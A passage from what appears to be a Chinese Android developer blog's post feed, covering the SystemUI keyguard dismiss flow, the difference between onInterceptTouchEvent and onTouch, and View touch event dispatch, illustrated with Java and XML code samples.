keyguard, then run it.</span></span><br><span class="line">    <span class="type">boolean</span> <span class="variable">deferKeyguardDone</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (mDismissAction != <span class="literal">null</span>) &#123;</span><br><span class="line">        deferKeyguardDone = mDismissAction.onDismiss();</span><br><span class="line">        mDismissAction = <span class="literal">null</span>;</span><br><span class="line">        mCancelAction = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mViewMediatorCallback != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (deferKeyguardDone) &#123;    <span class="comment">// deferKeyguardDone 上面设置成了 false</span></span><br><span class="line">            mViewMediatorCallback.keyguardDonePending(strongAuth, targetUserId);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 重点关注</span></span><br><span class="line">            mViewMediatorCallback.keyguardDone(strongAuth, targetUserId);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>KeyguardViewMediator#keyguardDone()</strong><br>frameworks/base/packages/SystemUI/src/com/android/systemui/keyguard/KeyguardViewMediator.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keyguardDone</span><span class="params">(<span class="type">boolean</span> strongAuth, <span class="type">int</span> targetUserId)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (targetUserId != ActivityManager.getCurrentUser()) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;keyguardDone&quot;</span>);</span><br><span class="line">        tryKeyguardDone();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">tryKeyguardDone</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (DEBUG) &#123;</span><br><span class="line">        Log.d(TAG, <span class="string">&quot;tryKeyguardDone: pending - &quot;</span> + mKeyguardDonePending + <span class="string">&quot;, animRan - &quot;</span></span><br><span class="line">                + mHideAnimationRun + <span class="string">&quot; animRunning - &quot;</span> + mHideAnimationRunning);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!mKeyguardDonePending &amp;&amp; mHideAnimationRun &amp;&amp; !mHideAnimationRunning) &#123;</span><br><span class="line">        handleKeyguardDone();</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!mHideAnimationRun) &#123;</span><br><span class="line">        <span class="keyword">if</span> (DEBUG) Log.d(TAG, <span class="string">&quot;tryKeyguardDone: starting pre-hide animation&quot;</span>);</span><br><span class="line">        mHideAnimationRun = <span class="literal">true</span>;</span><br><span class="line">        mHideAnimationRunning = <span class="literal">true</span>;</span><br><span class="line">        mKeyguardViewControllerLazy.get()</span><br><span class="line">                .startPreHideAnimation(mHideAnimationFinishedRunnable);    <span class="comment">// 启动预隐藏动画</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>onInterceptTouchEvent() 与 onTouch() 事件分析</title>
      <link href="/2023/12/24/2023-12-24/"/>
      <url>/2023/12/24/2023-12-24/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>本文主要分析 onTouch() 与 onTouchEvent() 事件的差异</p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>先看布局文件：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">com.longzhiye.intercepttouch.MyFrameLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">&quot;http://schemas.android.com/apk/res-auto&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.MainActivity&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">&quot;@+id/tv&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;200dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;200dp&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">&quot;#000000&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">&quot;Hello World!&quot;</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">com.longzhiye.intercepttouch.MyFrameLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>MyFrameLayout 是一个自定义View：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyFrameLayout</span> <span class="keyword">extends</span> <span class="title class_">FrameLayout</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyFrameLayout</span><span class="params">(<span class="meta">@NonNull</span> Context context)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyFrameLayout</span><span class="params">(<span class="meta">@NonNull</span> Context context, <span class="meta">@Nullable</span> AttributeSet attrs)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context, attrs);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyFrameLayout</span><span class="params">(<span class="meta">@NonNull</span> Context context, <span class="meta">@Nullable</span> AttributeSet attrs, <span class="type">int</span> defStyleAttr)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(context, attrs, defStyleAttr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onInterceptTouchEvent</span><span class="params">(MotionEvent event)</span> &#123;</span><br><span class="line">        <span class="keyword">switch</span> (event.getAction()) &#123;</span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_DOWN:</span><br><span class="line">                System.out.println(<span class="string">&quot;----onInterceptTouchEvent---ACTION_DOWN&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">           <span class="comment">//     break;</span></span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_POINTER_UP:</span><br><span class="line">                System.out.println(<span class="string">&quot;----onInterceptTouchEvent---ACTION_POINTER_UP&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_POINTER_DOWN:</span><br><span class="line">                System.out.println(<span class="string">&quot;----onInterceptTouchEvent---ACTION_POINTER_DOWN&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_MOVE:</span><br><span class="line">                System.out.println(<span class="string">&quot;----onInterceptTouchEvent---ACTION_MOVE&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_CANCEL:</span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_UP:</span><br><span class="line">                System.out.println(<span class="string">&quot;----onInterceptTouchEvent---ACTION_UP&quot;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unexpected value: &quot;</span> + event.getActionMasked());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>MainActivity：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span>  &#123;</span><br><span class="line">    TextView textView;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        textView = (TextView)findViewById(R.id.tv);</span><br><span class="line">        textView.setOnTouchListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnTouchListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouch</span><span class="params">(View view, MotionEvent motionEvent)</span> &#123;</span><br><span class="line">                <span class="keyword">switch</span> (motionEvent.getActionMasked()) &#123;</span><br><span class="line">                    <span class="keyword">case</span> MotionEvent.ACTION_DOWN:</span><br><span class="line">                        System.out.println(<span class="string">&quot;----onTouch---ACTION_DOWN&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> MotionEvent.ACTION_POINTER_UP:</span><br><span class="line">                        System.out.println(<span class="string">&quot;----onTouch---ACTION_POINTER_UP&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> MotionEvent.ACTION_POINTER_DOWN:</span><br><span class="line">                        System.out.println(<span class="string">&quot;----onTouch---ACTION_POINTER_DOWN&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> MotionEvent.ACTION_MOVE:</span><br><span class="line">                        System.out.println(<span class="string">&quot;----onTouch---ACTION_MOVE&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> MotionEvent.ACTION_CANCEL:</span><br><span class="line">                    <span class="keyword">case</span> MotionEvent.ACTION_UP:</span><br><span class="line">                        System.out.println(<span class="string">&quot;----onTouch---ACTION_UP&quot;</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Unexpected value: &quot;</span> + motionEvent.getActionMasked());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好了，开始进行分析：</p><p><img src="/images/20231224/20231224001.png"></p><p>当 onInterceptTouchEvent 事件返回 true，ViewGroup会将该事件进行拦截，无法向下(View)传递。在  onTouch 中将收不到事件。<br>当 onTouch  事件返回 true，则表明事件不再向下传递，自己处理，消耗掉，例子：该view的 onClick 事件将会失效。</p><h3 id="ViewGroup事件传递总结"><a href="#ViewGroup事件传递总结" class="headerlink" title="ViewGroup事件传递总结"></a>ViewGroup事件传递总结</h3><p><img src="/images/20231224/20231224002.png"></p><h3 id="View事件传递总结"><a href="#View事件传递总结" class="headerlink" title="View事件传递总结"></a>View事件传递总结</h3><p><img src="/images/20231224/20231224003.png"></p><p>这里需要特别注意的是，onTouch（）的执行 先于onClick（）。</p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> SystemUI </tag>
            
            <tag> framework </tag>
            
            <tag> Launcher </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 事件分发机制详解（下）</title>
      <link href="/2023/12/23/2023-12-23/"/>
      <url>/2023/12/23/2023-12-23/</url>
      
        <content type="html"><![CDATA[<h4 id="2-3-View事件分发机制"><a href="#2-3-View事件分发机制" class="headerlink" title="2.3 View事件分发机制"></a>2.3 View事件分发机制</h4><p>从上面 <strong>ViewGroup</strong> 事件分发机制知道，View事件分发机制从 <strong>dispatchTouchEvent()</strong> 开始</p><h4 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 源码分析：View.dispatchTouchEvent（）</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dispatchTouchEvent</span><span class="params">(MotionEvent event)</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> ( (mViewFlags &amp; ENABLED_MASK) == ENABLED &amp;&amp; </span><br><span class="line">              mOnTouchListener != <span class="literal">null</span> &amp;&amp;  </span><br><span class="line">              mOnTouchListener.onTouch(<span class="built_in">this</span>, event)) &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">return</span> onTouchEvent(event);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 说明：只有以下3个条件都为真，dispatchTouchEvent()才返回true；否则执行onTouchEvent()</span></span><br><span class="line">  <span class="comment">//   1. (mViewFlags &amp; ENABLED_MASK) == ENABLED</span></span><br><span class="line">  <span class="comment">//   2. mOnTouchListener != null</span></span><br><span class="line">  <span class="comment">//   3. mOnTouchListener.onTouch(this, event)</span></span><br><span class="line">  <span class="comment">// 下面对这3个条件逐个分析</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 条件1：(mViewFlags &amp; ENABLED_MASK) == ENABLED</span></span><br><span class="line"><span class="comment">  * 说明：</span></span><br><span class="line"><span class="comment">  *    1. 该条件是判断当前点击的控件是否enable</span></span><br><span class="line"><span class="comment">  *    2. 由于很多View默认enable，故该条件恒定为true（除非手动设置为false）</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 条件2：mOnTouchListener != null</span></span><br><span class="line"><span class="comment">  * 说明：</span></span><br><span class="line"><span class="comment">  *   1. mOnTouchListener变量在View.setOnTouchListener()里赋值</span></span><br><span class="line"><span class="comment">  *   2. 即只要给控件注册了Touch事件，mOnTouchListener就一定被赋值（即不为空）</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setOnTouchListener</span><span class="params">(OnTouchListener l)</span> &#123; </span><br><span class="line">    mOnTouchListener = l;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 条件3：mOnTouchListener.onTouch(this, event)</span></span><br><span class="line"><span class="comment">  * 说明：</span></span><br><span class="line"><span class="comment">  *   1. 即回调控件注册Touch事件时的onTouch()；</span></span><br><span class="line"><span class="comment">  *   2. 需手动复写设置，具体如下（以按钮Button为例）</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  button.setOnTouchListener(<span class="keyword">new</span> <span class="title class_">OnTouchListener</span>() &#123;  </span><br><span class="line">      <span class="meta">@Override</span>  </span><br><span class="line">      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouch</span><span class="params">(View v, MotionEvent event)</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">        <span class="comment">// 若在onTouch()返回true，就会让上述三个条件全部成立，从而使得View.dispatchTouchEvent（）直接返回true，事件分发结束</span></span><br><span class="line">        <span class="comment">// 若在onTouch()返回false，就会使得上述三个条件不全部成立，从而使得View.dispatchTouchEvent（）中跳出If，执行onTouchEvent(event)</span></span><br><span class="line">        <span class="comment">// onTouchEvent()源码分析 -&gt; 分析1</span></span><br><span class="line">      &#125;  </span><br><span class="line">  &#125;);</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 分析1：onTouchEvent()</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouchEvent</span><span class="params">(MotionEvent event)</span> &#123;  </span><br><span class="line">    ... <span class="comment">// 仅展示关键代码</span></span><br><span class="line">    <span class="comment">// 若该控件可点击，则进入switch判断中</span></span><br><span class="line">    <span class="keyword">if</span> (((viewFlags &amp; CLICKABLE) == CLICKABLE || (viewFlags &amp; LONG_CLICKABLE) == LONG_CLICKABLE)) &#123;  </span><br><span class="line">        <span class="comment">// 根据当前事件类型进行判断处理</span></span><br><span class="line">        <span class="keyword">switch</span> (event.getAction()) &#123; </span><br><span class="line">            <span class="comment">// a. 事件类型=抬起View（主要分析）</span></span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_UP:  </span><br><span class="line">                    performClick(); </span><br><span class="line">                    <span class="comment">// -&gt;&gt;分析2</span></span><br><span class="line">                    <span class="keyword">break</span>;  </span><br><span class="line">            <span class="comment">// b. 事件类型=按下View</span></span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_DOWN:  </span><br><span class="line">                postDelayed(mPendingCheckForTap, ViewConfiguration.getTapTimeout());  </span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="comment">// c. 事件类型=结束事件</span></span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_CANCEL:  </span><br><span class="line">                refreshDrawableState();  </span><br><span class="line">                removeTapCallback();  </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="comment">// d. 事件类型=滑动View</span></span><br><span class="line">            <span class="keyword">case</span> MotionEvent.ACTION_MOVE:  </span><br><span class="line">                <span class="keyword">final</span> <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> (<span class="type">int</span>) event.getX();  </span><br><span class="line">                <span class="keyword">final</span> <span class="type">int</span> <span class="variable">y</span> <span class="operator">=</span> (<span class="type">int</span>) event.getY();  </span><br><span class="line">                <span class="type">int</span> <span class="variable">slop</span> <span class="operator">=</span> mTouchSlop;  </span><br><span class="line">                <span class="keyword">if</span> ((x &lt; <span class="number">0</span> - slop) || (x &gt;= getWidth() + slop) ||  </span><br><span class="line">                        (y &lt; <span class="number">0</span> - slop) || (y &gt;= getHeight() + slop)) &#123;  </span><br><span class="line">                    removeTapCallback();  </span><br><span class="line">                    <span class="keyword">if</span> ((mPrivateFlags &amp; PRESSED) != <span class="number">0</span>) &#123;  </span><br><span class="line">                        removeLongPressCallback();  </span><br><span class="line">                        mPrivateFlags &amp;= ~PRESSED;  </span><br><span class="line">                        refreshDrawableState();  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="comment">// 若该控件可点击，就一定返回true</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="comment">// 若该控件不可点击，就一定返回false</span></span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  * 分析2：performClick（）</span></span><br><span class="line"><span class="comment">  */</span>  </span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">performClick</span><span class="params">()</span> &#123;  </span><br><span class="line">      <span class="keyword">if</span> (mOnClickListener != <span class="literal">null</span>) &#123;</span><br><span class="line">          <span class="comment">// 只要通过setOnClickListener()为控件View注册1个点击事件</span></span><br><span class="line">          <span class="comment">// 那么就会给mOnClickListener变量赋值（即不为空）</span></span><br><span class="line">          <span class="comment">// 则会往下回调onClick() &amp; performClick()返回true</span></span><br><span class="line">          playSoundEffect(SoundEffectConstants.CLICK);  </span><br><span class="line">          mOnClickListener.onClick(<span class="built_in">this</span>);  </span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;  </span><br><span class="line">      &#125;  </span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h4 id="源码总结"><a href="#源码总结" class="headerlink" title="源码总结"></a>源码总结</h4><p><img src="/images/20231223/20231223001.png"><br>这里需要特别注意的是， <strong>onTouch（）</strong> 的执行 先于 <strong>onClick（）</strong> </p><h4 id="核心方法总结"><a href="#核心方法总结" class="headerlink" title="核心方法总结"></a>核心方法总结</h4><p>主要包括:  <strong>dispatchTouchEvent()</strong> 、 <strong>onTouchEvent()</strong><br><img src="/images/20231223/20231223002.png"></p><h4 id="实例分析"><a href="#实例分析" class="headerlink" title="实例分析"></a>实例分析</h4><p>在本示例中，将分析2种情况：</p><blockquote><ol><li>注册Touch事件监听 且 在 <strong>onTouch()</strong> 返回false</li><li>注册Touch事件监听 且 在 <strong>onTouch()</strong> 返回true</li></ol><p><strong>分析1：注册Touch事件监听 且 在onTouch()返回false</strong></p></blockquote><h4 id="代码示例"><a href="#代码示例" class="headerlink" title="代码示例"></a>代码示例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 注册Touch事件监听setOnTouchListener 且 在onTouch()返回false</span></span><br><span class="line">button.setOnTouchListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnTouchListener() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onTouch</span><span class="params">(View v, MotionEvent event)</span> &#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;执行了onTouch(), 动作是:&quot;</span> + event.getAction());</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 2. 注册点击事件OnClickListener()</span></span><br><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">      <span class="meta">@Override</span></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">          System.out.println(<span class="string">&quot;执行了onClick()&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="测试结果"><a href="#测试结果" class="headerlink" title="测试结果"></a>测试结果</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">执行了onTouch(), 动作是:0</span><br><span class="line">执行了onTouch(), 动作是:1</span><br><span class="line">执行了onClick()</span><br></pre></td></tr></table></figure><h4 id="测试结果说明"><a href="#测试结果说明" class="headerlink" title="测试结果说明"></a>测试结果说明</h4><ul><li>点击按钮会产生两个类型的事件-按下View与抬起View，所以会回调两次 <strong>onTouch()</strong> ；</li><li>因为 <strong>onTouch()</strong> 返回了false，所以事件无被消费，会继续往下传递，即调用 <strong>View.onTouchEvent()</strong> ；</li><li>调用 <strong>View.onTouchEvent()</strong> 时，对于抬起View事件，在调用 <strong>performClick()</strong> 时，因为设置了点击事件，所以会回调 <strong>onClick()</strong> 。</li></ul><p><strong>分析2：注册Touch事件监听 且 在onTouch()返回true</strong></p><h4 id="代码示例-1"><a href="#代码示例-1" class="headerlink" title="代码示例"></a>代码示例</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 